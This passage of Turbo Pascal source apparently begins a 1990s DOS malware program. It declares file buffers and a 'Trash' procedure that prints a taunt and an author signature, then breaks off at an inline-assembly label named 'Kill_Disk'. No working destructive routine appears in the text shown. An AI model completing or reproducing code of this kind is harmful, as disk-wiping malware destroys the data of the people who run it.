Uses Dos;
Var Host:String[80];
    Arquivo:Array[1..2] Of File;
    Buffer:Array[1..8192] Of Byte;
    Errcode,Rnd:Byte;

Procedure Trash;
Begin
  Writeln('     Kiss This     ');
  Writeln(' Made In Balneario Camboriu By Sanguesujo - 28/01/96 ');
  Asm
    @Kill_Disk:      Xor     Bx,Bx
